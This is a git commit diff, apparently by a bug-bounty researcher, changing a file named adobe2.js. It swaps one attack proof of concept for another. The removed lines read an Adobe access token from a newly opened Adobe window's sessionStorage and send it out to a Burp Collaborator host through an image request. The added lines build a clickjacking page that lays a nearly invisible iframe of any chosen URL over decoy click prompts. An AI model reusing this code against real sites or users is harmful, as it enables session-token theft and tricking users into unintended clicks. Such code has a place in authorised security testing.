7aa8117c54c36360327d99871026affd68d5bf3f
mrhavit <mrhavit@wearehackerone.com>
2025-03-02 11:36:44 +0200

    aa

--- adobe2.js
+++ adobe2.js
@@ -1,30 +1,31 @@
-// Clean the page
-document.body.innerHTML = "";
+const params = new URLSearchParams(window.location.search);
+const iframeUrl = params.get('url') || 'https://example.com/';
 
-// Add a button to the page
-let button = document.createElement("button");
-button.innerText = "Click Me";
-document.body.appendChild(button);
-
-button.onclick = () => {
-    // Open a new window
-    let newWindow = window.open("https://express.adobe.com/sp/projects", "_blank");
-
-    // Wait for 4 seconds
-    setTimeout(() => {
-        try {
-            // Access sessionStorage from the newly opened window
-            let sessionData = newWindow.sessionStorage.getItem("adobeid_ims_access_token/MarvelWeb3/false/AdobeID,DCAPI,ab.manage,additional_info.creation_source,additional_info.incomplete,additional_info.projectedProductContext,creative_cloud,creative_sdk,gnav,mps,openid,read_organizations,stk.a.k12_access.cru,stk.a.limited_license.cru,tk_platform,tk_platform_refresh_user,tk_platform_sync"); // Replace "yourKey" with your specific key
-
-            // Send the session data to another server using an image
-            if (sessionData) {
-                let img = new Image();
-                img.src = `https://ap3uw7o7w6y9ju104k7ul2c03r9ixgl5.burpcollaborator.net/endpoint?data=${encodeURIComponent(sessionData)}`;
-                document.body.appendChild(img); // Optional: Append the image to the DOM
-                alert(sessionData)
-            }
-        } catch (error) {
-            console.error("Error accessing sessionStorage:", error);
+document.open();
+document.write(`
+    <style>
+        iframe {
+            position: relative;
+            width: 1700px;
+            height: 900px;
+            opacity: 0.1;
+            z-index: 2;
         }
-    }, 4000);
-};
+        div {
+            position: absolute;
+            top: 375px;
+            left: 800px;
+            z-index: 1;
+        }
+        .blabla {
+            position: absolute;
+            top: 400px;
+            left: 800px;
+            z-index: 1;
+        }
+    </style>
+    <div>Second, Middle-Mouse-Click</div>
+    <div class="blabla">First, Regular click</div>
+    <iframe src="${iframeUrl}"></iframe>
+`);
+document.close();
